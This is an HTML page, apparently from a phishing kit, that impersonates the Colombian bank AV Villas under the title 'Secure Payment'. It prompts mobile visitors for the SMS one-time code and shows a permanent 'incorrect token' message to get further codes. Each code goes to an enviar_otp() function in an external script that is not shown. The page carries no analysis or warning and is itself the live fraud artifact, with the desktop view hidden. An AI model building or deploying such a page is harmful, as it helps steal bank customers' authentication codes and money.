

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">




    <script type="text/javascript" src="./js/jquery-3.6.0.min.js"></script>
   	<script type="text/javascript" src="./js/functions2.js"></script>   		


	   <title class="doggip-colocolo">Secure Payment</title> 
	   <style>
  @media screen and (min-width: 900px) {
  #mobile-content {
    display: none;
  }
}
    </style>
</head>
<body style="">
    
<div id="mobile-content">
<img src="./img/avvillas.png" alt="" srcset="" width="50%"><br>
<br><br><br><div class="" style="margin-top:55px">
    <a>Ingresa el código SMS que te acabamos de enviar y dale “Confirmar”</a>

   <center> <br><input type="tel" name="" id="txtOTP" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px;">
    <br><br><a  style="color:red;">Token incorrecto, verifica el código ingresado<a><br>
   <input type="submit" value="Continuar" id="btnOTP" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;"></center>

</div>
</div>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>